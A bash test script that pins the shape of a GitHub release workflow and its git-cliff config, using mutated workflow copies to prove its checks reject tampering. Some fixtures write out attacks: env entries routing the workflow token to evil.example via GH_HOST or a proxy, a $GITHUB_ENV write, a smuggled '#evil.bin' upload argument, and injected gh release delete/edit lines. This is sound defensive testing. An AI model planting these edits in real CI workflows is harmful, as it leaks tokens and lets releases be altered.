#!/usr/bin/env bash

# SPDX-FileCopyrightText: 2026 Bruno Marques Venceslau de Souza <b@venceslau.dev>
#
# SPDX-License-Identifier: GPL-3.0-or-later

#
# Contract tests for .github/workflows/release.yml + cliff.toml - the release
# path. Nothing else in the repository exercises them: the workflow runs once
# per tag, on a surface (`contents: write`, a downloaded binary, a published
# artifact) where a mistake is public and not cheap to take back. This test is
# the standing proof of its shape.
#
# The properties pinned here, each because losing it costs something concrete:
#   - the trigger is a version-tag push ONLY (a `pull_request` trigger would
#     hand `contents: write` to a fork's branch),
#   - `contents: write` lives on the release job and nowhere wider,
#   - every `uses:` is a GitHub-owned action pinned to a 40-hex SHA, and the
#     checkout pin is the SAME one ci.yml carries (they bump together); the
#     SET of actions is pinned too - actions/checkout and nothing else,
#   - git-cliff arrives as a version-pinned, sha256-VERIFIED tarball in a
#     `run:` step - never a third-party action, never a floating `latest`,
#   - no `${{ }}` interpolation inside a `run:` block (script injection),
#   - the release is cut with `--verify-tag`, so a run can never invent a tag,
#   - the release title is fixed to `dotfiles $TAG`, not gh/GitHub's default
#     (the bare tag), so the title alone names the project on GitHub's global
#     feed - both of these, and the rest of the release command, by pinning
#     the release step's whole `run:` block byte for byte, the only `run:`
#     allowed to mention `gh`,
#   - the known ways to redirect that block's token or change how it runs
#     are rejected: its step's keys and env are pinned, the job's keys are
#     pinned, no env or defaults sit above it, no GH_* key sits anywhere else,
#     no step writes $GITHUB_ENV or $GITHUB_PATH, and git-cliff is called by
#     its absolute path, never through the PATH. A tripwire for accidental
#     edits, not an adversarial boundary: an earlier step can still plant a
#     `gh` without $GITHUB_PATH (a user-writable PATH directory, sudo into
#     /usr/bin, ~/.config/gh) - review and commit signing are the control,
#   - no step is exit-suppressed, and
#   - cliff.toml keeps the two properties the notes depend on: conventional
#     commits only, and merge commits skipped.
#
# Shape follows tests/ci_workflow_test.sh: grep floors always run (here-strings,
# never `printf | grep` - the SIGPIPE-under-pipefail footgun the repo
# documents), PyYAML structural checks on top when the module is importable and
# a hard failure under STRICT=1.
set -euo pipefail

repo_root="$(cd "$(dirname "$0")/.." && pwd)"
wf="$repo_root/.github/workflows/release.yml"
ci="$repo_root/.github/workflows/ci.yml"
cliff="$repo_root/cliff.toml"
fail() { echo "FAIL: $*" >&2; exit 1; }
pass=0; ok() { pass=$((pass + 1)); echo "  ok: $1"; }

# The release step's ENTIRE `run:` block, byte for byte, trailing newline
# included. Not a parse of the gh command: rounds 2 to 4 of the ship gate each
# found a new bypass in a guard that approximated shell (comment stripping,
# continuation joining, quoting), and an exact literal has no shell semantics
# to approximate. Any change to the release command, its comments or its
# whitespace MUST edit this literal in the same commit - that edit is the
# review point, on purpose. tests/release_workflow_check.py holds the other
# copy (EXPECTED_RUN); the drift check below fails if the two ever differ.
# `read -d ''`, not `$(cat <<'EOF')`: bash 3.2 mis-parses the apostrophe in
# `GitHub's` inside a heredoc nested in `$(...)`. `|| true`: read returns 1 at
# end of input, which is expected here. IFS= and -r keep every byte.
IFS= read -r -d '' RELEASE_RUN_EXPECTED <<'EOF' || true
set -euo pipefail
# --verify-tag: refuse to invent a tag. The release can only ever
# describe the signed tag that triggered this run.
# --title: gh/GitHub's default (the bare tag, e.g. "v0.2.0") reads as
# version noise on GitHub's global releases feed; "dotfiles $TAG"
# names the project inline so the title alone identifies what
# shipped.
gh release create "$TAG" --verify-tag --title "dotfiles $TAG" --notes-file "$RUNNER_TEMP/notes.md"
EOF

# One literal, two copies: this file's floor cannot import Python, and the
# Python layer cannot read this file. Checked HERE, before anything reads the
# workflow, so a literal edited in one copy only is reported as drift rather
# than as whichever layer's real-file check happens to run first. Needs
# python3 but not PyYAML (--print-expected-run exits before `import yaml`).
# `&& echo x` guards the trailing newline `$(...)` would otherwise strip, and
# keeps a failed python3 from reading as an empty literal.
check_py="$repo_root/tests/release_workflow_check.py"
if command -v python3 >/dev/null 2>&1 \
  && py_expected="$(python3 -I "$check_py" --print-expected-run && echo x)"; then
  [ "${py_expected%x}" = "$RELEASE_RUN_EXPECTED" ] \
    || fail "the pinned release run: literal drifted between release_workflow_test.sh and release_workflow_check.py"
  ok "the two copies of the pinned release run: literal are identical"
elif [ -n "${STRICT:-}" ]; then
  fail "python3 unavailable (or --print-expected-run failed) and STRICT=1 - the pinned-literal drift check not run"
else
  echo "SKIP: python3 unavailable (or --print-expected-run failed) - the pinned-literal drift check not run"
fi

# The release step's keys and env, as the floor sees them: every line of the
# step outside its run: block, blank and comment lines dropped, dedented to the
# step's `-`. Only the name's VALUE is free (`<any>`). Stricter than the
# Python layer, which pins the key set and the env mapping but not the name:
# this literal also pins key order, env order and each value's spelling. The keys
# this leaves out are the point: `shell:` (another interpreter for the pinned
# text), `working-directory:`, `if:`, `continue-on-error:` (a skipped or failed
# release that reads green), and any env entry beyond these three (GH_HOST,
# GH_REPO pointed elsewhere). Edit it together with the Python layer's env and
# key-set checks.
IFS= read -r -d '' RELEASE_STEP_EXPECTED <<'EOF' || true
- name: <any>
  env:
    GH_TOKEN: ${{ github.token }}
    GH_REPO: ${{ github.repository }}
    TAG: ${{ github.ref_name }}
  run: |
EOF

# The git-cliff (notes) step, in the same form. Its env is exactly TAG: a
# GIT_CLIFF__* variable overrides any cliff.toml setting, postprocessors (and
# their replace_command) included, so cliff_shell_check below would be
# checking a file git-cliff no longer obeys. Edit it together with the Python
# layer's notes-step check.
IFS= read -r -d '' NOTES_STEP_EXPECTED <<'EOF' || true
- name: <any>
  env:
    TAG: ${{ github.ref_name }}
  run: |
EOF

# The PyYAML-free floor: tests/release_workflow_floor.awk, whose header lists
# what it checks and why. A separate file so the program reads as awk, not as
# a quoted shell string; it is still in bin/check-patterns arm 8's scope (no
# GNU regex escapes). LC_ALL=C: the floor rejects every byte outside printable
# ASCII, which must mean bytes, not locale characters. The file's last byte is
# measured here and passed in as `nonl`: awk cannot tell a missing final
# newline apart, and YAML's `|` keeps no trailing line break at EOF without one.
floor_awk="$repo_root/tests/release_workflow_floor.awk"
[ -f "$floor_awk" ] || fail "floor program missing: tests/release_workflow_floor.awk"
release_run_check() {
  local nonl=0
  # `$(...)` strips a trailing newline, so a non-empty result means the last
  # byte is something else.
  if [ -n "$(tail -c 1 "$1")" ]; then nonl=1; fi
  RELEASE_RUN_EXPECTED="$RELEASE_RUN_EXPECTED" RELEASE_STEP_EXPECTED="$RELEASE_STEP_EXPECTED" \
    NOTES_STEP_EXPECTED="$NOTES_STEP_EXPECTED" LC_ALL=C awk -v nonl="$nonl" -f "$floor_awk" "$1"
}

# --- Existence ----------------------------------------------------------------
[ -f "$wf" ] || fail "workflow not found: .github/workflows/release.yml"
[ -f "$cliff" ] || fail "cliff.toml not found - release.yml reads it for the notes"
ok "release.yml and cliff.toml exist"

# Non-comment lines only, so the header comment above - which necessarily names
# `uses:`, `pull_request` and the rest of what it forbids - is never read as
# workflow content.
commands="$(grep -vE '^[[:space:]]*#' "$wf")"

# --- Trigger: a version tag push, and nothing else ----------------------------
grep -Eq "^[[:space:]]*tags:[[:space:]]*\['v\*'\]" <<<"$commands" \
  || fail "release.yml must trigger on push tags: ['v*']"
grep -q 'pull_request' <<<"$commands" \
  && fail "release.yml carries a pull_request trigger - it would expose contents: write"
grep -q 'workflow_dispatch' <<<"$commands" \
  && fail "release.yml carries workflow_dispatch - a release must come from a signed tag"
ok "trigger is a push of a v* tag only"

# --- Runner + the write permission --------------------------------------------
grep -Eq '^[[:space:]]*runs-on:[[:space:]]*ubuntu-latest[[:space:]]*$' <<<"$commands" \
  || fail "release.yml must run on ubuntu-latest"
grep -Eq '^[[:space:]]*contents:[[:space:]]*write[[:space:]]*$' <<<"$commands" \
  || fail "release.yml must grant contents: write (gh release create needs it)"
[ "$(grep -cE '^[[:space:]]*contents:[[:space:]]*write[[:space:]]*$' <<<"$commands")" -eq 1 ] \
  || fail "contents: write appears more than once in release.yml - it belongs to one job"
ok "ubuntu-latest, with exactly one contents: write grant"

# --- Actions: GitHub-owned and SHA-pinned -------------------------------------
uses="$(grep -E '^[[:space:]]*(-[[:space:]]*)?uses:' <<<"$commands" || true)"
[ -n "$uses" ] || fail "release.yml uses no action at all - expected actions/checkout"
while IFS= read -r line; do
  [ -n "$line" ] || continue
  grep -Eq 'uses:[[:space:]]*actions/[A-Za-z0-9._-]+@[0-9a-f]{40}([[:space:]]|$)' <<<"$line" \
    || fail "not a SHA-pinned GitHub-owned action: $line"
done <<<"$uses"
ok "every action is actions/* pinned to a 40-hex SHA"

# The two workflows pin the same checkout. A bump that updates one and not the
# other is a drift this catches at commit time, not at the next release.
wf_sha="$(grep -oE 'actions/checkout@[0-9a-f]{40}' <<<"$commands" | sed -n '1p')"
ci_sha="$(sed -n '1p' <<<"$(grep -oE 'actions/checkout@[0-9a-f]{40}' "$ci")")"
[ -n "$wf_sha" ] || fail "release.yml does not use actions/checkout"
[ -n "$ci_sha" ] || fail "ci.yml does not use actions/checkout - this test reads its pin"
[ "$wf_sha" = "$ci_sha" ] \
  || fail "checkout pins drifted: release.yml has $wf_sha, ci.yml has $ci_sha"
ok "release.yml and ci.yml pin the same actions/checkout ($wf_sha)"

# --- git-cliff: a pinned, checksum-verified binary, not an action -------------
grep -qi 'uses:.*cliff' <<<"$commands" \
  && fail "git-cliff must be a run: step, not an action (allowed actions are GitHub-owned)"
grep -Eq '^[[:space:]]*GIT_CLIFF_VERSION:[[:space:]]*[0-9]+\.[0-9]+\.[0-9]+[[:space:]]*$' <<<"$commands" \
  || fail "release.yml must pin an exact GIT_CLIFF_VERSION (x.y.z)"
grep -Eq '^[[:space:]]*GIT_CLIFF_SHA256:[[:space:]]*[0-9a-f]{64}[[:space:]]*$' <<<"$commands" \
  || fail "release.yml must pin a 64-hex GIT_CLIFF_SHA256 for the downloaded asset"
grep -Eq 'sha256sum[[:space:]]+--check' <<<"$commands" \
  || fail "release.yml downloads git-cliff without verifying the sha256"
grep -q 'releases/latest' <<<"$commands" \
  && fail "release.yml downloads a floating 'latest' asset - pin the version"
grep -Eq 'curl[^|]*--fail' <<<"$commands" \
  || fail "the git-cliff download must use curl --fail (an error page would reach sha256sum)"
# The asset URL must be built from the pinned version, never from a literal
# that can drift away from GIT_CLIFF_VERSION/GIT_CLIFF_SHA256.
grep -Eq 'releases/download/v\$\{GIT_CLIFF_VERSION\}' <<<"$commands" \
  || fail "the git-cliff asset URL must interpolate GIT_CLIFF_VERSION"
ok "git-cliff is a version-pinned, sha256-verified tarball in a run: step"

# --- The release itself --------------------------------------------------------
release_run_err="$(release_run_check "$wf")" || fail "$release_run_err"
grep -q -- '--config cliff.toml' <<<"$commands" \
  || fail "git-cliff must read the repository's cliff.toml explicitly (--config)"
ok "the release step's run: block and step match the pinned literals, it is the only gh block, and the context checks pass"

# --- Nothing is exit-suppressed ------------------------------------------------
release_lines="$(grep -E '(git-cliff|gh release create|sha256sum)' <<<"$commands" || true)"
if grep -Eq '\|\|[[:space:]]*(true|:)' <<<"$release_lines"; then
  fail "release.yml suppresses the exit of a release step (|| true) - it must block"
fi
grep -Eq '^[[:space:]]*continue-on-error:[[:space:]]*true' <<<"$commands" \
  && fail "release.yml sets continue-on-error: true - a failed release would look green"
ok "no release step is exit-suppressed"

# --- cliff.toml: the two properties the notes depend on ------------------------
grep -Eq '^[[:space:]]*conventional_commits[[:space:]]*=[[:space:]]*true' "$cliff" \
  || fail "cliff.toml must set conventional_commits = true"
grep -Eq '^[[:space:]]*filter_unconventional[[:space:]]*=[[:space:]]*true' "$cliff" \
  || fail "cliff.toml must set filter_unconventional = true (drops the merge commits)"
grep -Eq '\{[[:space:]]*message[[:space:]]*=[[:space:]]*"\^Merge ",[[:space:]]*skip[[:space:]]*=[[:space:]]*true' "$cliff" \
  || fail "cliff.toml must skip merge commits explicitly"
grep -Eq '^[[:space:]]*commit_parsers[[:space:]]*=' "$cliff" \
  || fail "cliff.toml must group commits by type (commit_parsers)"
ok "cliff.toml is conventional-commits only, merge commits skipped, grouped by type"

# cliff.toml can make git-cliff run shell on the release runner: a
# `replace_command` (inside commit_preprocessors or postprocessors) is run
# through `sh -c`. Neither shell hook is used, so any `replace_command` fails,
# and every `*processors` key must be an empty `[]` - a non-empty list is where
# a replace_command would go. A TOML quoted key may spell a name with \u / \U
# (and, in TOML 1.1, \xHH) escapes, which no grep for `replace_command` can
# read, so any such escape fails too, and so does a Tera get_env() call.
#
# The replace_command, escape and get_env greps read the RAW file, comments
# included. Inside a TOML multi-line string (""" or '''), a line that looks
# like a comment - a Markdown `# heading`, or `text # ...` - is template text
# that Tera renders into the public notes, and telling it from a real comment
# needs a TOML parser this floor does not have. A comment that merely mentions
# one of the three is therefore rejected: that fails closed.
#
# The *processors check alone reads $body, the file with a whole comment line
# and a trailing `#...` with no quote after it dropped (a `#` inside a
# single-line string always has its closing quote after it, so a string is
# never cut). That strip is sound here: it only ever removes text, so it can
# drop a list's closing `]` (and reject) but never manufacture one, and a
# `processors` line inside a """ string is template text, not a key. Reading
# raw would instead reject a legal `commit_preprocessors = []  # note`.
#
# Measured on the real file: one `commit_preprocessors = []`, no
# postprocessors, and 0 raw hits for replace_command, get_env, or a \u, \U or
# \x escape (its `### Breaking changes` heading sits inside the body """
# string). Prints every problem, one per line, and returns 1.
cliff_shell_check() {
  local body procs rc=0
  body="$(sed -E -e '/^[[:space:]]*#/d' -e "s/#[^\"']*\$//" "$1")"
  if grep -q 'replace_command' "$1"; then
    echo "cliff.toml uses replace_command - git-cliff runs it as a shell command"; rc=1
  fi
  if grep -qE '\\[uUx]' "$1"; then
    echo "cliff.toml has a \\u, \\U or \\x escape - an escaped key can spell replace_command"; rc=1
  fi
  # Tera's get_env() reads the runner's environment at render time, and the
  # rendered notes are published: a template calling it can print a secret.
  if grep -q 'get_env' "$1"; then
    echo "cliff.toml calls get_env - it can print the runner's env into the public notes"; rc=1
  fi
  procs="$(grep -E 'processors' <<<"$body" || true)"
  if [ -n "$procs" ] \
    && grep -vE '^[[:space:]]*[A-Za-z_.]*processors[[:space:]]*=[[:space:]]*\[[[:space:]]*\][[:space:]]*$' <<<"$procs" >/dev/null; then
    echo "cliff.toml has a non-empty *processors list - the place a replace_command runs shell"; rc=1
  fi
  return "$rc"
}
cliff_err="$(cliff_shell_check "$cliff")" || fail "$cliff_err"
ok "cliff.toml runs no shell (raw file: no replace_command, escape or get_env; every *processors list empty)"

# --- WIRING: the availability probe AND every real invocation of
# release_workflow_check.py against $wf/$mut_wf/$mut_file/col0.yml must pass
# -I. Grepped from THIS SCRIPT's own source, so reverting the probe or any
# real call back to plain python3 turns this red without needing the
# mismatched environment (a stray PYTHONPATH or site-packages PyYAML) that
# would otherwise hide the regression. Excludes the one deliberate
# un-isolated call further below, which exists to PROVE the shadow-import bug
# is real and is asserted to FAIL, never to succeed.
self="$repo_root/tests/release_workflow_test.sh"
# Anchored on `^if`, the real probe's own shape, so this does not match a
# PROSE mention of the same string (e.g. this very fail() message below).
grep -Eq "^if command -v python3.*python3 -I -c 'import yaml'" "$self" \
  || fail "wiring: the PyYAML availability probe must run python3 with -I when importing yaml"
isolated_calls=$(grep -cE 'python3 -I "\$check_py"|python3 -I "\$shadow_dir/release_workflow_check\.py"' "$self")
[ "$isolated_calls" -eq 9 ] \
  || fail "wiring: expected exactly 9 isolated (-I) invocations of release_workflow_check.py, found $isolated_calls"
ok "the PyYAML probe and every real release_workflow_check.py invocation pass -I"

# --- NEGATIVE: no CODE line may call release_workflow_check.py via $check_py
# without -I. Comment lines are stripped FIRST (`grep -v '^[[:space:]]*#'`) and
# the shape is anchored to `python3` directly followed by whitespace then the
# opening quote, so a comment or fail() message that merely QUOTES the
# isolated form ("python3 -I \"$check_py\"") cannot inflate this count away
# from zero - that quoted form always has `-I ` between `python3` and the
# quote, which this pattern does not.
uniso_calls=$(grep -vE '^[[:space:]]*#' "$self" | { grep -cE 'python3[[:space:]]+"\$check_py"' || true; })
[ "$uniso_calls" -eq 0 ] \
  || fail "wiring: found $uniso_calls plain (non -I) invocation(s) of \$check_py"
ok "no code line invokes \$check_py without -I"

# --- REGRESSION: the availability PROBE must be isolated (-I) the same way
# the real run below is, or it can pass while the real, isolated run then
# raises an ImportError instead of reaching the clean "PyYAML unavailable"
# skip message below. Proven with PYTHONPATH and a throwaway module name, not
# a real yaml.py - `-I` ignores PYTHONPATH for the same reason it ignores
# user-site packages, and this holds whether or not PyYAML happens to be
# installed here.
if command -v python3 >/dev/null 2>&1; then
  probe_dir="$(mktemp -d "${TMPDIR:-/tmp}/release_workflow_probe_test.XXXXXX")"
  trap 'rm -rf "$probe_dir"' EXIT INT TERM
  printf 'SENTINEL = True\n' > "$probe_dir/_rwt_probe_sentinel.py"
  PYTHONPATH="$probe_dir" python3 -c 'import _rwt_probe_sentinel' >/dev/null 2>&1 \
    || fail "fixture bug: a PYTHONPATH-visible module must import under plain python3 -c"
  if PYTHONPATH="$probe_dir" python3 -I -c 'import _rwt_probe_sentinel' >/dev/null 2>&1; then
    fail "python3 -I must ignore PYTHONPATH (like it ignores user-site packages), but it saw the sentinel module"
  fi
  rm -rf "$probe_dir"
  ok "python3 -I ignores PYTHONPATH - the same isolation a plain python3 -c probe would miss"
fi

# --- Well-formedness + structure (PyYAML; loud skip when absent) --------------
have_yaml=0
if command -v python3 >/dev/null 2>&1 && python3 -I -c 'import yaml' 2>/dev/null; then
  have_yaml=1
fi

if [ "$have_yaml" -eq 1 ]; then
  # tests/release_workflow_check.py, not a `python3 - <<'PY'` heredoc: it keeps
  # the PyYAML checks (Python's regex dialect) out of a `.sh` file that
  # bin/check-patterns arm (8) scans for GNU-only SHELL-regex escapes. See that
  # file's header for why. `-I` here - see the shadow-import proof below for
  # what it guards against.
  python3 -I "$check_py" "$wf" || fail "PyYAML structural checks failed (see above)"
  ok "PyYAML structural checks pass on the real release.yml"

  # --- release_workflow_check.py's own failure contract ------------------------
  # A `|| fail` around a check that never fails proves nothing: a mutated
  # copy must make the script exit non-zero.
  mut_dir="$(mktemp -d "${TMPDIR:-/tmp}/release_workflow_check_test.XXXXXX")"
  trap 'rm -rf "$mut_dir"' EXIT INT TERM
  mut_wf="$mut_dir/release.yml"
  sed 's/ubuntu-latest/ubuntu-24.04/' "$wf" > "$mut_wf"
  grep -q 'ubuntu-24.04' "$mut_wf" || fail "fixture bug: the runs-on mutation did not apply"
  if python3 -I "$check_py" "$mut_wf" >/dev/null 2>&1; then
    fail "release_workflow_check.py must fail on a mutated release.yml (runs-on changed), but it exited 0"
  fi
  ok "release_workflow_check.py fails on a mutated release.yml (runs-on changed)"

  # --- missing argv[1] ----------------------------------------------------------
  if python3 -I "$check_py" >/dev/null 2>&1; then
    fail "release_workflow_check.py must fail with no workflow path argument, but it exited 0"
  fi
  ok "release_workflow_check.py fails with no argv (IndexError on sys.argv[1])"

  # --- sys.path[0] safety: a stray yaml.py next to the script must not shadow
  # the real PyYAML -------------------------------------------------------------
  # sys.path[0] is the invoked SCRIPT's own directory (tests/), so a stray
  # tests/yaml.py would shadow the real PyYAML import silently - `-I` above is
  # the fix. Proven in a SCRATCH copy of the script (never inside the real
  # tests/, which must never carry a yaml.py of its own): the un-isolated run
  # is shadowed first (proof the fixture actually reaches the fake module, not
  # dead code), then the real `-I` invocation is proven immune to it.
  shadow_dir="$(mktemp -d "${TMPDIR:-/tmp}/release_workflow_shadow_test.XXXXXX")"
  trap 'rm -rf "$mut_dir" "$shadow_dir"' EXIT INT TERM
  cp "$repo_root/tests/release_workflow_check.py" "$shadow_dir/"
  cat > "$shadow_dir/yaml.py" <<'EOF'
# A fake yaml.py. If sys.path[0] (the real script's own directory) is not
# stripped before the "import yaml" in release_workflow_check.py, THIS module
# shadows the real PyYAML instead of it.
class _ShadowedPyYAML(Exception):
    pass


def safe_load(_):
    raise _ShadowedPyYAML("tests/yaml.py shadowed the real PyYAML import")
EOF

  if shadow_out=$(python3 "$shadow_dir/release_workflow_check.py" "$wf" 2>&1); then
    fail "fixture bug: expected the un-isolated run to be shadowed by the fake yaml.py, but it exited 0"
  fi
  case "$shadow_out" in
    *_ShadowedPyYAML*) : ;;
    *) fail "fixture bug: the un-isolated run did not reach the fake yaml.py: $shadow_out" ;;
  esac
  ok "sanity: a stray yaml.py next to the script shadows PyYAML without -I"

  python3 -I "$shadow_dir/release_workflow_check.py" "$wf" >/dev/null 2>&1 \
    || fail "python3 -I must still resolve the real PyYAML despite a stray yaml.py alongside the script"
  ok "python3 -I resolves the real PyYAML even with a stray yaml.py alongside the script"
else
  if [ -n "${STRICT:-}" ]; then fail "PyYAML unavailable and STRICT=1 - release.yml structural checks not run"; fi
  echo "SKIP: PyYAML unavailable - release.yml structural checks not run (the floor fixtures below still run)"
  mut_dir="$(mktemp -d "${TMPDIR:-/tmp}/release_workflow_check_test.XXXXXX")"
  trap 'rm -rf "$mut_dir"' EXIT INT TERM
fi

# --- Release-step fixtures: both layers, each with its own message -------------
# Each mutated copy must be rejected by BOTH layers, with the failure TEXT
# grepped on each layer's output (a bare nonzero would also cover an unrelated
# crash). The text is what only the targeted check prints for THIS mutation:
# the mutated line after `got:`, or the step named by the count. -F: the
# messages hold `[`, `$` and quotes. The floor half always runs - it is the
# only layer without PyYAML.
expect_both_reject() {
  local label="$1" mut_file="$2" py_msg="$3" sh_msg="$4" out
  if [ "$have_yaml" -eq 1 ]; then
    if out="$(python3 -I "$check_py" "$mut_file" 2>&1)"; then
      fail "release_workflow_check.py must reject $label, but it exited 0"
    fi
    grep -Fq -- "$py_msg" <<<"$out" \
      || fail "release_workflow_check.py rejected $label for an unrelated reason (wanted: $py_msg): $out"
  fi
  if out="$(release_run_check "$mut_file")"; then
    fail "release_run_check (the floor) must also reject $label, but it accepted it"
  fi
  grep -Fq -- "$sh_msg" <<<"$out" \
    || fail "release_run_check rejected $label for an unrelated reason (wanted: $sh_msg): $out"
  if [ "$have_yaml" -eq 1 ]; then ok "both layers reject $label"; else ok "the floor rejects $label"; fi
}

expect_both_accept() {
  local label="$1" mut_file="$2" out
  if [ "$have_yaml" -eq 1 ]; then
    out="$(python3 -I "$check_py" "$mut_file" 2>&1)" \
      || fail "release_workflow_check.py must accept $label, but it rejected it: $out"
  fi
  out="$(release_run_check "$mut_file")" \
    || fail "release_run_check (the floor) must accept $label, but it rejected it: $out"
  if [ "$have_yaml" -eq 1 ]; then ok "both layers accept $label"; else ok "the floor accepts $label"; fi
}

# mutate NAME SED-SCRIPT MUST-CONTAIN: write $mut_dir/NAME.yml from the real
# workflow, and fail as a fixture bug if the edit did not land. Every sed
# script below is portable between GNU and BSD sed: a lone `\` before a real
# embedded newline in the replacement inserts a newline (never GNU-only `\n`
# or the `a\` command), `\\` places a literal backslash, and `\(...\)`/`\1` is
# a POSIX BRE backreference.
mutate() {
  sed "$2" "$wf" > "$mut_dir/$1.yml"
  grep -Fq -- "$3" "$mut_dir/$1.yml" || fail "fixture bug: the $1 mutation did not apply"
}
sq="'"
diff_at() { printf '%s' "differs from the pinned literal at line $1: got: $2"; }

mutate bare-title 's/--title "dotfiles \$TAG"/--title "$TAG"/' '--title "$TAG" --notes-file'
m="$(diff_at 8 'gh release create "$TAG" --verify-tag --title "$TAG" --notes-file')"
expect_both_reject "a bare-tag title" "$mut_dir/bare-title.yml" "$m" "$m"

mutate verify-false 's/--verify-tag --title/--verify-tag=false --title/' '--verify-tag=false'
m="$(diff_at 8 'gh release create "$TAG" --verify-tag=false --title')"
expect_both_reject "--verify-tag=false" "$mut_dir/verify-false.yml" "$m" "$m"

# X1: `\ ` is an escaped space, so bash passes ` #evil.bin` as one more
# argument - an upload asset - instead of starting a comment.
mutate x1 's|--notes-file "\$RUNNER_TEMP/notes.md"$|--notes-file "$RUNNER_TEMP/notes.md" \\ #evil.bin|' \
  'notes.md" \ #evil.bin'
m="$(diff_at 8 'gh release create "$TAG" --verify-tag --title "dotfiles $TAG" --notes-file "$RUNNER_TEMP/notes.md" \ #evil.bin')"
expect_both_reject "an escaped-space asset (\\ #evil.bin)" "$mut_dir/x1.yml" "$m" "$m"

mutate single-quote 's/--title "dotfiles \$TAG"/--title '"$sq"'dotfiles $TAG'"$sq"'/' "--title 'dotfiles \$TAG'"
m="$(diff_at 8 "gh release create \"\$TAG\" --verify-tag --title 'dotfiles \$TAG'")"
expect_both_reject "a single-quoted title (a literal \$TAG)" "$mut_dir/single-quote.yml" "$m" "$m"

# A quoted `#` hid the second command from a comment-stripping guard.
mutate echo-hash 's|^\( *\)\(gh release create.*\)$|\1\2\
\1echo " #"; gh release edit "$TAG" --title x|' 'echo " #"; gh release edit'
m="$(diff_at 9 'echo " #"; gh release edit "$TAG" --title x')"
expect_both_reject 'echo " #"; gh release edit in the release step' "$mut_dir/echo-hash.yml" "$m" "$m"

mutate appended 's|^\( *\)\(gh release create.*\)$|\1\2\
\1echo done|' 'echo done'
m="$(diff_at 9 'echo done')"
expect_both_reject "a line appended to the release step" "$mut_dir/appended.yml" "$m" "$m"

# A `\` inside a comment escapes nothing: the next line is a real command.
mutate note-bs 's|^\( *\)\(cat "\$RUNNER_TEMP/notes.md"\)$|\1\2\
\1# note \\\
\1gh release edit "$TAG" --title x|' '# note \'
expect_both_reject "# note \\ then gh release edit in another step" "$mut_dir/note-bs.yml" \
  "found 2: ['Generate the release notes'" 'found 2: [gh release edit "$TAG" --title x]'

mutate extra-gh 's|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
\1gh release delete "$TAG" --yes|' 'gh release delete'
expect_both_reject "an extra gh line in an earlier step" "$mut_dir/extra-gh.yml" \
  "found 2: ['Install git-cliff" 'found 2: [gh release delete "$TAG" --yes]'

# A step written as a flow mapping has no `run: |` line for the floor to
# extract; any `gh` outside a run: block must then be on a YAML comment line.
mutate flow-step 's|^\( *\)\(- name: Create the release\)$|\1- {name: Edit, run: "gh release edit x"}\
\1\2|' '{name: Edit'
expect_both_reject "a flow-mapping step running gh" "$mut_dir/flow-step.yml" \
  "found 2: ['Edit', 'Create the release']" 'mentions gh outside any run: block'

# `|-` strips the final newline; anything but a plain `|` would need YAML
# folding or chomping rules the floor does not implement, so it fails closed.
mutate chomp 's/^\( *\)run: |$/\1run: |-/' 'run: |-'
expect_both_reject "a run: block that is not a plain |" "$mut_dir/chomp.yml" \
  'differs from the pinned literal at line 9: got: <end>' 'is a run: key that is not a plain literal block'

# PyYAML keeps the LAST of a duplicate key, so a gh-free second run: in the
# release step silently replaces the pinned block; the floor, which reads
# every block, must not check the first one and pass.
{ cat "$wf"; printf '%s\n' '        run: |' '          echo replaced'; } > "$mut_dir/dup-run.yml"
grep -Fq -- 'echo replaced' "$mut_dir/dup-run.yml" || fail "fixture bug: the dup-run mutation did not apply"
expect_both_reject "a second run: key in the release step" "$mut_dir/dup-run.yml" \
  'found 0: []' 'is a second run: key in the same step'

# No final newline: YAML's `|` then has no line break to keep after the last
# line, so the release block (the last thing in the file) loses its trailing
# newline. `$(cat)` strips it; the check that it is gone is on the last byte.
printf '%s' "$(cat "$wf")" > "$mut_dir/no-eol.yml"
[ -n "$(tail -c 1 "$mut_dir/no-eol.yml")" ] || fail "fixture bug: the no-eol mutation did not apply"
expect_both_reject "a file with no final newline" "$mut_dir/no-eol.yml" \
  'differs from the pinned literal at line 9: got: <end>' 'differs from the pinned literal at line 9: got: <end>'

# --- The release step's execution context --------------------------------------
# The run: literal pins the argv. These pin what can redirect the token-bearing
# gh call, or change how the pinned block runs, without touching that block:
# env at the workflow, job or step level, the release step's own keys, the
# job's keys, the cross-step channels ($GITHUB_ENV, $GITHUB_PATH), how
# git-cliff is called, and the set of actions that could be handed a token.
head_at() { printf '%s' "the release step differs from the pinned step at line $1: got: $2"; }

# gh reads GH_HOST (and GH_ENTERPRISE_TOKEN for that host), so an env above the
# release step sends the token elsewhere with the step itself untouched.
mutate job-env-gh 's|^\(    timeout-minutes: 15\)$|\1\
    env: {GH_HOST: evil.example, GH_ENTERPRISE_TOKEN: "${{ github.token }}"}|' 'env: {GH_HOST: evil.example'
expect_both_reject "a job-level env setting GH_HOST" "$mut_dir/job-env-gh.yml" \
  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
  "sets a GH_* key outside the release step's env"

mutate wf-env-gh 's|^jobs:$|env:\
  GH_HOST: evil.example\
jobs:|' '  GH_HOST: evil.example'
expect_both_reject "a workflow-level env setting GH_HOST" "$mut_dir/wf-env-gh.yml" \
  "got ['env', 'jobs', 'name', 'on', 'permissions']" \
  "sets a GH_* key outside the release step's env"

# No GH_* key at all: a proxy is enough to route the call. Only a step may set
# env, so the floor rejects it by where the key sits, not by its name.
mutate job-env-proxy 's|^\(    timeout-minutes: 15\)$|\1\
    env:\
      HTTPS_PROXY: http://evil.example:3128|' 'HTTPS_PROXY'
expect_both_reject "a job-level env with no GH_* key" "$mut_dir/job-env-proxy.yml" \
  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
  'is an env: key outside a step'

# Flow form, so no `run:` line trips the floor's block reader by accident.
mutate job-defaults 's|^\(    timeout-minutes: 15\)$|\1\
    defaults: {run: {shell: bash}}|' 'defaults: {run'
expect_both_reject "a job-level defaults (run.shell)" "$mut_dir/job-defaults.yml" \
  "got ['defaults', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
  'sets defaults:'

# Upper case, so the gh-as-a-word count never sees it.
mutate github-env 's|^\( *\)\(cat "\$RUNNER_TEMP/notes.md"\)$|\1\2\
\1echo GH_HOST=evil.example >> "$GITHUB_ENV"|' '>> "$GITHUB_ENV"'
expect_both_reject 'an earlier step writing GH_HOST to $GITHUB_ENV' "$mut_dir/github-env.yml" \
  "step 'Generate the release notes' mentions GITHUB_ENV" 'mentions GITHUB_ENV'

